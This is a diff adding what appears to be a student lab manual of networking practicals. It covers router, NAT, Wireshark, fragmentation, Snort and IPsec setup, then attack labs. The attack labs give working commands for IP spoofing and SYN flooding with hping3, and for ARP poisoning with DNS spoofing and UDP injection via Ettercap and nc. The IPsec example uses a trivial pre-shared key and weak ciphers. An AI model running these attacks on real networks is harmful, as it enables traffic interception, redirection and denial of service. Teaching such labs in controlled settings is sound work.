@@ -1,0 +1,578 @@
+PRACTICAL 1 :Basic Network Setup with Router and Switch
+Required Devices
+ 1 Router (e.g., Cisco 1941).
+ 1 Switch (e.g., Cisco 2960).
+ 2 PCs.
+ PC1 Configuration:
+o Click on PC1, go to Desktop > IP Configuration.
+o Set:
+ IP Address: 192.168.1.2
+ Subnet Mask: 255.255.255.0
+ Default Gateway: 192.168.1.1 (Router&#39s interface).
+
+ PC2 Configuration:
+o Click on PC2, go to Desktop > IP Configuration.
+o Set:
+ IP Address: 192.168.1.3
+ Subnet Mask: 255.255.255.0
+ Default Gateway: 192.168.1.1.
+Configure the Router
+1. Click on the Router.
+2. Go to the CLI tab.
+3. Enter the following commands to configure the interface:
+Router> enable
+Router# configure terminal
+Router(config)# interface GigabitEthernet0/0
+Router(config-if)# ip address 192.168.1.1 255.255.255.0
+Router(config-if)# no shutdown
+Router(config-if)# exit
+Router(config)# exit
+---------------------------------------------------------------------------------------------------------------------------------------------------
+PRACTICAL 2 : Designing and Configuring IPv4 Addressing
+Scheme in a Mixed Classful and Classless
+Network
+
+Network Setup
+1. Devices Required:
+o 2 Routers (2621XM)
+o 2 Switches (2960)
+o 4 PCs
+2. Network Topology:
+o Router 1 (Classful Network):
+ LAN: 192.168.1.0/24 (Class C)
+ WAN: 172.16.1.0/30 (Class B)
+o Router 2 (Classless Network):
+ LAN: 10.0.0.0/29
+
+3. Connections:
+o PC1 and PC2 to Switch1 (Router 1 LAN).
+
+o PC3 and PC4 to Switch2 (Router 2 LAN).
+o Router 1 connects to Router 2 via a WAN link.
+4. Step-by-Step Configuration
+Router 1 Configuration:
+1. Open Router1 and go to the CLI tab.
+2. Configure the interfaces:
+Router> enable
+Router# configure terminal
+Router(config)# interface gigabitEthernet 0/0
+Router(config-if)# ip address 192.168.1.1 255.255.255.0
+Router(config-if)# no shutdown
+Router(config-if)# exit
+Router(config)# interface serial 0/0/0
+Router(config-if)# ip address 172.16.1.1 255.255.255.252
+Router(config-if)# no shutdown
+Router(config-if)# exit
+
+Router 2 Configuration:
+1. Open Router2 and go to the CLI tab.
+2. Configure the interfaces:
+Router> enable
+Router# configure terminal
+Router(config)# interface gigabitEthernet 0/0
+Router(config-if)# ip address 10.0.0.1 255.255.255.248
+Router(config-if)# no shutdown
+Router(config-if)# exit
+Router(config)# interface serial 0/0/0
+Router(config-if)# ip address 172.16.1.2 255.255.255.252
+Router(config-if)# no shutdown
+Router(config-if)# exit
+
+PC Configuration:
+1. Assign IP addresses and default gateways to each PC:
+
+o PC1: IP: 192.168.1.2, Subnet Mask: 255.255.255.0, Gateway: 192.168.1.1.
+o PC2: IP: 192.168.1.3, Subnet Mask: 255.255.255.0, Gateway: 192.168.1.1.
+o PC3: IP: 10.0.0.2, Subnet Mask: 255.255.255.248, Gateway: 10.0.0.1.
+o PC4: IP: 10.0.0.3, Subnet Mask: 255.255.255.248, Gateway: 10.0.0.1.
+
+Configure Routing
+Enable routing between the networks.
+Router 1: Add a route to the classless network:
+
+Router(config)# ip route 10.0.0.0 255.255.255.248 172.16.1.2
+
+Router 2: Add a route to the classful network:
+
+Router(config)# ip route 192.168.1.0 255.255.255.0 172.16.1.1
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+PRACTICAL 3 : NAT
+Step 1: Setting Up the Topology
+1. Add Devices to the Workspace:
+o Drag and drop:
+ 1 Router (e.g., 2911 or similar).
+ 1 Switch (e.g., 2960).
+ 3 PCs (PC-0, PC-1, PC-2).
+ 1 Cloud or Server (representing the internet).
+
+Step 2: Assign IP Addresses
+For Private Network (PCs and Router Internal Interface)
+ Assign Private IP Addresses to the PCs:
+o PC-0: IP Address: 192.168.1.2 | Subnet Mask: 255.255.255.0 | Default Gateway:
+192.168.1.1
+o PC-1: IP Address: 192.168.1.3 | Subnet Mask: 255.255.255.0 | Default Gateway:
+192.168.1.1
+o PC-2: IP Address: 192.168.1.4 | Subnet Mask: 255.255.255.0 | Default Gateway:
+192.168.1.1
+
+Step 3: Configure Router interface
+1) gig0/0
+Router> enable
+Router# configure terminal
+Router(config)# interface gig0/0
+Router(config-if)# ip address 192.168.1.1 255.255.255.0
+Router(config-if)# no shutdown
+2) gig0/1
+Router(config)# interface gig0/1
+Router(config-if)# ip address 203.0.113.1 255.255.255.0
+Router(config-if)# no shutdown
+3) Assign an IP Address to the Cloud or Server:
+a. Cloud/Server IP Address: 203.0.113.2
+b. Subnet Mask: 255.255.255.0
+
+Step 4: Configure NAT on the Router
+Define Inside and Outside Interfaces
+Router(config)# interface gig0/0
+Router(config-if)# ip nat inside
+Router(config-if)# exit
+Router(config)# interface gig0/1
+Router(config-if)# ip nat outside
+Router(config-if)# exit
+Set Up PAT (Port Address Translation)
+Allow multiple private IPs to share one public IP:
+Router(config)# access-list 1 permit 192.168.1.0 0.0.0.255
+Router(config)# ip nat inside source list 1 interface gig0/1 overload
+Step 5: Configure Routing
+Add a Default Route to direct traffic to the public network
+Router(config)# ip route 0.0.0.0 0.0.0.0 203.0.113.2
+Step 6: Test the Configuration
+Test Internet Access from PCs
+1. Open the Command Prompt on any PC.
+2. Ping the external Cloud/Server (e.g., ping 203.0.113.2).
+o If successful, NAT is working correctly.
+
+Verify NAT Translations on the Router
+On the router CLI, use the following command to see active NAT translations:
+Router# show ip nat translations
+
+Final Network Details Summary
+Device Interface IP Address Subnet Mask Role
+Router gig0/0 192.168.1.1 255.255.255.0 NAT Inside (LAN)
+gig0/1 203.0.113.1 255.255.255.0 NAT Outside (WAN)
+PC-0 - 192.168.1.2 255.255.255.0 Private Device
+PC-1 - 192.168.1.3 255.255.255.0 Private Device
+PC-2 - 192.168.1.4 255.255.255.0 Private Device
+Cloud - 203.0.113.2 255.255.255.0 Internet/Server
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+PRACTICAL 4 : Analysis of IPv4 Datagrams: Source, Destination, and IP Options
+1. Opened Wireshark and selected the Wi-Fi interface.
+2. Applied the filter ip.version == 4.
+3. Generated network traffic by visiting websites like google.com.
+4. Captured packets for 30 seconds and stopped the capture.
+5. Analyzed the IPv4 packets for source and destination addresses and IP options.
+Output:
+ Packet 1:
+o Source Address: 192.168.0.105
+o Destination Address: 8.8.8.8
+o TTL: 128
+o Total Length: 60 bytes
+ Packet 2:
+o Source Address: 192.168.0.105
+o Destination Address: 192.168.0.1
+o TTL: 64
+o IP Options: If present, this section will show additional information like timestamps
+or routing options.
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+PRACTICAL 5 : Analyzing the Effects of Packet
+Fragmentation on Network Efficiency
+and Router Performance
+
+Q) Configure and test fragmentation by adjusting packet size and
+observing how routers handle fragmented packets. Determine the impact of
+fragmentation on network performance.
+Answer:
+Step1: Open Wireshark capture the packet
+Step2: netsh interface ipv4 show subinterfaces (for checking MTU value i.e
+1500)
+output:
+MTU MediaSenseState Bytes In Bytes Out Interface
+------ --------------- --------- --------- -------------
+4294967295 1 0 46945 Loopback Pseudo-Interface 1
+1500 1 82743597 13902916 Ethernet
+
+Step3: Pick Any of the following protocol
+A) Using ICMP use following command:
+1. netsh interface ipv4 show subinterfaces (for checking MTU value
+i.e1500)
+2. ping 8.8.8.8 -f -l 1472
+output:
+Pinging 8.8.8.8 with 1472 bytes of data:
+Reply from 8.8.8.8: bytes=1472 time=13ms TTL=119
+Reply from 8.8.8.8: bytes=1472 time=24ms TTL=119
+Reply from 8.8.8.8: bytes=1472 time=3ms TTL=119
+Reply from 8.8.8.8: bytes=1472 time=3ms TTL=119
+Ping statistics for 8.8.8.8:
+Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+Minimum = 3ms, Maximum = 24ms, Average = 10ms
+
+3. ping 8.8.8.8 -f -l 2000
+output:
+Pinging 8.8.8.8 with 2000 bytes of data:
+Packet needs to be fragmented but DF set.
+Packet needs to be fragmented but DF set.
+Packet needs to be fragmented but DF set.
+Packet needs to be fragmented but DF set.
+
+Ping statistics for 8.8.8.8:
+Packets: Sent = 4, Received = 0, Lost = 4 (100% loss),
+
+4. ping 8.8.8.8 -l 2000
+output:
+Pinging 8.8.8.8 with 2000 bytes of data:
+Request timed out.
+Request timed out.
+Request timed out.
+Request timed out.
+Ping statistics for 8.8.8.8:
+Packets: Sent = 4, Received = 0, Lost = 4 (100% loss),
+5. ip.flags.mf == 1 or ip.frag_offset > 0 (Use this filter on Wireshark)
+B) Using UDP use following command:
+1. nping --udp -p 53 --data-length 2000 8.8.8.8
+output:
+WARNING: Payload exceeds maximum recommended payload (1400)
+Starting Nping 0.7.95 ( https://nmap.org/nping ) at 2025-02-18 15:55 India
+Standard Time
+SENT (0.0510s) UDP 192.168.0.221:53 > 8.8.8.8:53 ttl=64 id=30719
+iplen=2028
+SENT (1.0520s) UDP 192.168.0.221:53 > 8.8.8.8:53 ttl=64 id=30719
+iplen=2028
+SENT (2.0520s) UDP 192.168.0.221:53 > 8.8.8.8:53 ttl=64 id=30719
+iplen=2028
+SENT (3.0520s) UDP 192.168.0.221:53 > 8.8.8.8:53 ttl=64 id=30719
+iplen=2028
+SENT (4.0520s) UDP 192.168.0.221:53 > 8.8.8.8:53 ttl=64 id=30719
+iplen=2028
+
+Max rtt: N/A | Min rtt: N/A | Avg rtt: N/A
+Raw packets sent: 5 (10.210KB) | Rcvd: 0 (0B) | Lost: 5 (100.00%)
+Nping done: 1 IP address pinged in 5.05 seconds
+
+2. ip.flags.mf == 1 or ip.frag_offset > 0 (Use this filter on Wireshark)
+C) Using TCP use following command:
+1. nping --tcp -p 53 --data-length 2000 8.8.8.8
+output:
+WARNING: Payload exceeds maximum recommended payload
+(1400)
+Starting Nping 0.7.95 ( https://nmap.org/nping ) at 2025-02-18
+15:57 India Standard Time
+SENT (0.0500s) TCP 192.168.0.221:10474 > 8.8.8.8:53 S ttl=64
+id=1995 iplen=2040 seq=3084669001 win=1480
+SENT (1.0510s) TCP 192.168.0.221:10474 > 8.8.8.8:53 S ttl=64
+id=1995 iplen=2040 seq=3084669001 win=1480
+SENT (2.0510s) TCP 192.168.0.221:10474 > 8.8.8.8:53 S ttl=64
+id=1995 iplen=2040 seq=3084669001 win=1480
+SENT (3.0510s) TCP 192.168.0.221:10474 > 8.8.8.8:53 S ttl=64
+id=1995 iplen=2040 seq=3084669001 win=1480
+SENT (4.0510s) TCP 192.168.0.221:10474 > 8.8.8.8:53 S ttl=64
+id=1995 iplen=2040 seq=3084669001 win=1480
+Max rtt: N/A | Min rtt: N/A | Avg rtt: N/A
+Raw packets sent: 5 (10.270KB) | Rcvd: 0 (0B) | Lost: 5 (100.00%)
+Nping done: 1 IP address pinged in 5.05 seconds
+
+2. ip.flags.mf == 1 or ip.frag_offset > 0 (Use this filter on Wireshark)
+
+--------------------------------------------------------------------------------------------------------
+PRACTICAL 6: IDS and IPsec
+Aim: Analyze a network for potential vulnerabilities and propose security
+measures to mitigate risks, such as implementing IPsec or using intrusion
+detection systems (IDS).
+Part A: Setup and Installation
+
+Step 1: Update System
+sudo apt clean
+sudo apt update --fix-missing
+
+Step 2: Add Universe Repository (if needed)
+sudo add-apt-repository universe
+sudo apt update
+
+Step 3: Install Snort 3
+sudo apt install snort
+
+Step 4: Verify Snort Version
+snort –V
+Part B: Configure Snort 3
+
+Step 5: Find Network Details
+ip a (Note the IP and interface (e.g., eth0, wlan0))
+
+Step 6: Configure Snort Variables
+Edit config file: sudo nano /etc/snort/snort.lua
+HOME_NET = '192.168.111.0/24'
+EXTERNAL_NET = 'any'
+
+Step 7: Create Rules Directory and File
+sudo mkdir -p /etc/snort/rules
+sudo nano /etc/snort/rules/local.rules
+alert icmp any any -> $HOME_NET any (msg:"ICMP Packet Detected"; sid:1000001;)
+include = 'rules/local.rules' (Include this in snort.lua)
+
+Step 8: Create Log Directory
+sudo mkdir -p /var/log/snort
+sudo chmod 777 /var/log/snort
+Part C: Test Snort IDS
+
+Step 9: Run Snort in IDS Mode
+sudo snort -c /etc/snort/snort.lua -i eth0 -A alert_fast -l /var/log/snort
+
+Step 10: Generate ICMP Traffic
+ping -c 4 192.168.111.X
+
+Step 11: Check Snort Alerts
+sudo cat /var/log/snort/alert
+Expected output:
+[**] [1:1000001:0] ICMP Packet Detected [**]
+
+Ipsec :
+1. Install StrongSwan (IPsec tool)
+sudo apt update
+sudo apt install strongswan
+
+2. Configure Ipsec
+
+sudo nano /etc/ipsec.conf
+Paste this content:
+config setup
+charondebug="all"
+conn win-kali
+auto=add
+left=YOUR_KALI_IP
+right=YOUR_WINDOWS_IP
+authby=psk
+keyexchange=ikev2
+type=transport
+ike=aes256-sha1-modp1024!
+esp=aes256-sha1!
+3. Set the Pre-Shared Key
+sudo nano /etc/ipsec.secrets
+YOUR_KALI_IP YOUR_WINDOWS_IP : PSK "test123"
+4. Restart StrongSwan
+
+sudo systemctl restart strongswan
+
+Step-by-step: Windows Setup
+1. Open Windows Settings
+Go to:
+Control Panel > Network and Sharing Center > Set up a new connection or
+network
+2. Choose "Connect to a Workplace" > "Use my Internet connection (VPN)"
+ Internet Address: Kali IP (e.g., 192.168.1.100)
+ Destination name: Any name (like KaliVPN)
+ Uncheck "Use a smart card"
+Click Create.
+3. Set VPN Properties
+
+ Go to: Settings > Network & Internet > VPN
+ Click on your VPN > Advanced Options > Edit
+Change:
+ VPN Type: IKEv2
+ Pre-shared key: test123 (same as you used in Kali)
+Save settings.
+Step 5: Test the Connection
+From Windows:
+ Go to your VPN and click Connect
+ If all is set correctly, you should be connected to Kali via IPsec
+Expected Output
+From Kali:
+Run:
+sudo ipsec status
+You should see something like:
+Security Associations (1 up, 0 connecting):
+win-kali[1]: ESTABLISHED ...
+------------------------------------------------------------------------------------------------------------------------------
+
+PRACTICAL 7: IP Spoofing Attack and Prevention
+
+Aim: Simulate an IP Spoofing attack and demonstrate its impact on network
+security. Develop countermeasures to prevent and mitigate IP Spoofing
+attacks.
+Prerequisites
+ Kali Linux (Attacker Machine)
+ Windows Machine (Victim Machine)
+ hping3 installed on Kali Linux
+ Firewall disabled on the Windows machine (temporarily for testing)
+ Both machines connected to the same network
+
+2. Setup and Verification
+Step 1: Identify Network Configuration
+On Kali Linux, run:
+ip a
+On the Windows machine, run:
+Ipconfig
+
+Step 2: Verify Connectivity
+On Kali Linux, test the connection to the victim machine:
+ping -c 4 <Victim_IP>
+
+
+Step 3: Spoof an IP and Send SYN Packets
+Run the following command on Kali Linux:
+sudo hping3 -a <Spoofed_IP> -c 5 -S -p 80 <Victim_IP>
+
+Step 4: Analyze Results
+After executing the command, you may encounter 100% packet loss.
+
+
+Step 5: Check If Spoofed Packets Reach the Victim
+Run on Kali Linux:
+sudo tcpdump -n host <Victim_IP>
+While running the attack in another terminal. If no packets appear, the network might be
+blocking them.
+
+Step 6: Test with Normal SYN Packets
+Run:
+sudo hping3 -S -p 80 -c 5 <Victim_IP>
+If normal packets work but spoofed ones don’t, then spoofing is being blocked.
+
+Step 7: Try Different Spoofed IPs
+Use another IP from arp-scan results:
+sudo hping3 -a 192.168.6.66 -c 5 -S -p 80 192.168.6.32
+If this also results in 100% packet loss, then spoofing is likely being blocked at the network
+level.
+5. Prevention and Countermeasures
+
+Step 8: Enable Firewall 
+
+
+------------------------------------------------------------------------------------------------------------------------------
+
+PRACTICAL 8: TCP Session Hijaking (dns_spoof)
+
+Aim: Create a scenario involving a TCP session hijacking attempt and
+demonstrate how to detect and prevent such attacks using appropriate
+security measures.
+Requriment :
+Ettercap installed (sudo apt install ettercap-graphical)
+Firewalls or antivirus on victim may block spoofing
+Turn off victim antivirus/firewall for testing
+Make sure both devices are in same network
+
+Step 1: Edit Hosts File for Spoofing
+Open this file:
+sudo nano /usr/share/ettercap/etter.dns
+Add a fake redirect line at the top like this:
+google.com A 192.168.6.1 (This means: when the victim opens google.com, they will be
+redirected to 192.168.6.1 (you can replace it with your fake site or local Apache server IP).)
+Then save it:
+Ctrl + O → Enter → Ctrl + X
+Step 2: Start Ettercap GUI
+sudo ettercap –G
+Step 3: Select Interface
+ Go to Sniff > Unified Sniffing
+ Choose eth0 or wlan0 (whatever is active)
+
+Step 4: Scan and Add Targets
+1. Hosts > Scan for hosts
+2. Hosts > Hosts list
+3. Add:
+o Victim to Target 1
+o Gateway/Router to Target 2
+
+Step 5: ARP Poisoning
+ Go to Mitm > ARP poisoning
+ Tick "Sniff remote connections"
+ Click OK
+Step 6: Activate Plugin
+ Go to Plugins > Manage Plugins
+ Double-click on dns_spoof to activate it (you’ll see a green ✔️ if active)
+Step 7: Test on Victim
+ Now, on the victim system, open a browser and visit:
+ http://google.com
+ It should now redirect to the IP address you set (e.g., your fake page).
+
+------------------------------------------------------------------------------------------------------------------------------
+
+PRACTICAL 9: UDP Session Hijaking
+
+Aim: Create a scenario for UDP hijacking within a simulated network
+environment.
+Requirements:
+ Kali Linux (Attacker)
+ One Windows/Linux system (Victim)
+ Both connected to the same network
+ Ettercap installed in Kali
+ Disable antivirus/firewall temporarily for demo (carefully)
+Step 1: Open Ettercap
+On Kali Linux, open terminal and type:
+sudo ettercap –G
+Step 2: Select Network Interface
+ Go to menu: Sniff > Unified sniffing
+ Select your network interface (usually eth0 or wlan0)
+ Click OK
+Step 3: Scan for Hosts
+ Go to menu: Hosts > Scan for hosts
+Step 4: Add Victim and Gateway
+ Go to menu: Hosts > Hosts list
+ Select your Victim IP → Click Add to Target 1
+ Select your Gateway IP → Click Add to Target 2
+Step 5: Start ARP Poisoning
+ Go to menu: Mitm > ARP Poisoning
+ Check ✔ Sniff remote connections
+ Click OK
+
+👉 Now attacker is in middle of victim and router.
+Step 6: Open Terminal to Send Fake UDP Packet
+Open new terminal in Kali and type this:
+echo "Hello from attacker" | nc -u [victim IP] 5555
+This sends a fake UDP message to victim on port 5555.
+Step 7: Open Wireshark to See UDP Packet
+ Open Wireshark on victim or attacker machine
+ Filter: udp
+ You will see:
+o Fake UDP message sent from attacker
+o Victim receiving unexpected data
+
+Step 8: Stop Ettercap
+ Go to Mitm > Stop Mitm attack
+ Then File > Quit 
+
+------------------------------------------------------------------------------------------------------------------------------
+
+PRACTICAL 10 : Denial-of-Service (DoS) attack
+
+Aim: Design and execute a Denial-of-Service (DoS) attack simulation against a
+target server or network within a controlled environment.
+
+Step 1: Connect both to same network
+ If using VirtualBox/VMware:
+o Use Host-only Adapter or Internal Network
+ If real machines, connect both to same WiFi
+Step 2: Find Windows IP
+ On Windows, open Command Prompt and run:
+ Ipconfig
+Step 3: Open Kali Terminal and run:
+ hping3 -S --flood -V -p 80 <Windows-IP>
+ hping3 -S --flood -V -p 80 192.168.1.5
+Explanation:
+ -S: TCP SYN flood
+
+ --flood: send packets fast
+ -p 80: target port 80 (web port, usually open)
+ -V: show output
+ 192.168.1.5: Windows IP
+Monitoring on Windows:
+Step 4: Open Task Manager > Performance > Ethernet/Wi-Fi
+You will see network usage going up. The machine may get slow or laggy.
+You can also run:
+netstat –an
+Stop the Attack:
+Ctrl + C
+
+
